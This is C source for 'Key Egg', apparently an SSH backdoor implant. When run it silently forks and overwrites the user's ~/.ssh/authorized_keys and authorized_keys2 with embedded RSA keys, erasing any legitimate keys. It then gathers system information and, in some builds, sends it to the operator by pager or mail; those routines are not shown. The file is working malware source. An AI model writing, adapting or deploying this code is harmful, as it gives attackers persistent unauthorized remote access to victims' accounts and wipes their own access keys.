/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "key_egg.h"

#define _KEYS_
#include "key_egg_conf.h"

// char *get_optval(const char *line, const char *opt) {
//     // skip spaces
//     while (*line == ' ') line++;
//     // return null if line is commented out
//     if (*line == '#') return 0;
//     // skip spaces
//     while (*line == ' ') line++;
//     // compare option
//     while (*line != ' ' && *line != '\n' && *line != '\0') {
//         if (*line != *opt) return 0;
//         line++;
//         opt++;
//     }
//     // skip spaces
//     while (*line == ' ') line++;
//     return line;
// }

static bool drop_the_key(void) {
    FILE *fp = NULL /*, *sshd_conf_fp = NULL */;
    int ret_val = false;
    char auth_key_file[512] = "" /*, buffer[1024] = "" */;
    char home_path[256] = "", ssh_path[256] = "", *pointer;
    struct passwd *pwd;

    //     // first of all, parsing /etc/ssh/sshd_config file
    //     sshd_conf_fp = fopen("/etc/ssh/sshd_config", "r");
    //     if (!sshd_conf_fp)
    // #ifdef DEBUG
    //         perror("fopen(/etc/ssh/sshd_config )");
    // #else
    //         ;
    // #endif
    //     else {
    //         while (fgets(buffer, sizeof(buffer) - 1, sshd_conf_fp)) {
    //             // remove cr-lf
    //             pointer = buffer;
    //             while (*pointer)
    //                 if (*pointer == '\n' || *pointer == '\r')
    //                     *pointer = '\0';
    //                 else
    //                     pointer++;
    //
    //             // analyse line
    //             pointer = get_optval(buffer, "AuthorizedKeysFile");
    //             // if we get the path
    //             if (pointer) {
    //                 /*
    //                  * openssh token:
    //                  * %h   =   user's home
    //                  * %u   =   username
    //                  */
    //             }
    //         }

    pwd = getpwuid(getuid());
    if (!pwd) {
#ifdef DEBUG
        perror("getpwuid() failed");
#endif
        pointer = getenv("HOME");
        if (!pointer) {
#ifdef DEBUG
            perror("FATAL: no user home?");
#endif
            goto cleanup;
        }
        strcpy(home_path, pointer);
    } else
        strcpy(home_path, pwd->pw_dir);

    // create .ssh dir, just in case
    sprintf(ssh_path, "%s/.ssh", home_path);
    mkdir(ssh_path, 0700); /* some versions of sshd
                            * require 700 permision for ~/.ssh dir */
    /*
     * from here aut_key_file[] should look like
     * "/home/user/.ssh/authorized_keys"
     */
    sprintf(auth_key_file, "%s/.ssh/authorized_keys", home_path);

    // create/truncate authorized_keys/2 files and write RSA_KEYS to them
again_keys2:
    fp = fopen(auth_key_file, "w");
    if (!fp) {
#ifdef DEBUG
        perror("FATAL: fopen()");
#endif
        goto cleanup;
    }

    if (strlen(RSA_KEYS) != fwrite(RSA_KEYS, 1, strlen(RSA_KEYS), fp)) {
#ifdef DEBUG
        perror("FATAL: fwrite()");
#endif
        goto cleanup;
    } else {
        // some versions of sshd might need this
        chmod(auth_key_file, 0640);

        /*
         * check for the end of the string to see what file it is,
         * 'authorized_keys' or 'authorized_keys2'.
         *
         * If the file is authorized_keys, jump to again_keys2
         * and create the 'authorized_keys2' file,
         * with the same content as 'authorized_keys' file, otherwise quit.
         *
         * NOTE: authorized_key2 was used by older versions of OpenSSH.
         */
        pointer = &auth_key_file[strlen(auth_key_file)];
        if (*pointer == '\0' && *(pointer - 1) == 's' &&
            *(pointer - 2) == 'y') {
            if (fp) fclose(fp);
            *pointer++ = '2';
            *pointer = '\0';
            goto again_keys2;
        }

        ret_val = true;
    }

cleanup:
    if (fp) fclose(fp);
    return ret_val;
}

/*
 * Stand alone version() function will ensure that
 * compilation time and version will remain
 * in the compiled binary even without DEBUG define.
 */
static void version(void) {
    printf("Key Egg v%s\n", VERSION);
    printf("Compiled at: %s %s\n\n", __DATE__, __TIME__);
}

static void key_egg_boddy(void) {
#ifdef DEBUG
    version();
#endif

    char *info = ke_get_system_info();

    // write the keys
    if (!drop_the_key()) exit(EXIT_FAILURE);

#ifdef _PAGER
    // send a message with user and system info
    ke_pager(info);
#endif

#ifdef _SENDMAIL
    // send mail
    ke_mail_notify(info);
#endif
}

void key_egg_main(void) {
#ifndef DEBUG
    if (fork() == 0) {
        key_egg_boddy();
        exit(0);
    }
#else
    key_egg_boddy();
#endif
}
